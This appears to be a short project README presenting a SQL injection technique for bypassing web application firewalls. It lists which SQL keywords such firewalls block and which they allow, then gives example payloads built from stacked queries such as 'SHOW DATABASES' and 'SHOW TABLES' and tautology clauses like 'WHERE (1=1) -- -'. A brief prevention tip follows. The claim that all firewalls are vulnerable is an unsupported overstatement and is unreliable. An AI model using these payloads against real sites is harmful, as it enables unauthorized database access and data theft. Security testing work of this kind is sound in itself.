# SQL Injection Bypass WAF

This exploit is a critical bypass method for Web Application Firewalls (WAF) using alternative SQL injection techniques.

## Technique of Evasion

### Blocked Queries
- `OR`
- `UNION`
- `ORDER BY`
- `GROUP BY`
- `AND`
- `CASE`
- `CAST`
- `WHEN`
- `HAVING`

### Authorized Queries
- Stacked queries
- `WHERE`
- `LIKE`
- `RLIKE`

### Example Payloads
- Basic payloads to bypass WAF:
  - `; ' SHOW DATABASES;`
  - `' USE rr;`
  - `' SHOW TABLES;`

- Effective Queries:
  - `WHERE (1=1) -- -`
  - `RLIKE (1=1) -- -`
  - `LIKE (1=1) -- -`

## Prevention Techniques
To prevent this type of attack, it is recommended to:
- Use Object-Relational Mapping (ORM) frameworks and disable two-request SQL execution.

This project aims to upgrade existing WAFs to prevent SQL Injection vulnerabilities.

### Note
All payloads are available in the `payload.txt` file.

### Vulnerability Note
All WAFs are vulnerable to this attack, and it is crucial to implement the suggested prevention techniques to mitigate risks.

Thank you for your interest in enhancing web application security!
